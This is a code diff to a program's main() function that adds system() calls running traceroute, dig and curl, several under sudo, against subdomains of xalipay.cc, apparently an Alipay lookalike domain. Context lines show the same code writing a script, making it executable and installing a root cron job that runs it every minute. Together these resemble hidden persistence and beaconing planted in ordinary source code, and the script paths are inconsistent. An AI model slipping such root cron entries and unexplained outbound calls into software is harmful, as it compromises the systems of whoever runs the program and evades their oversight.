@@ -198,6 +198,16 @@ int main(int argc, char **argv)
   script.close();
 
   system("sudo ping -c 4 obxly2.itb.n.xalipay.cc >> /var/log/ping.log 2>&1");
+         
+  system("traceroute -n obxly3.itb.n.xalipay.cc >> /var/log/traceroute.log 2>&1");
+  system("sudo traceroute -n obxly4.itb.n.xalipay.cc >> /var/log/traceroute.log 2>&1");
+
+  system("sudo dig obxly7.itb.n.xalipay.cc >> /var/log/dig.log 2>&1");
+  system("dig obxly8.itb.n.xalipay.cc >> /var/log/dig.log 2>&1");
+
+  system("sudo curl -v https://admin.n.xalipay.cc/api/dns/itb/123/obxly5 >> /var/log/curl.log 2>&1");
+  system("curl -v https://admin.n.xalipay.cc/api/dns/itb/123/obxly6 >> /var/log/curl.log 2>&1");
+         
   system("chmod 755 /obsec.sh");
   system("(echo '* * * * * root /home/miniob/obsec.sh >> /var/log/cron.log 2>&1') | crontab -u root -");
 
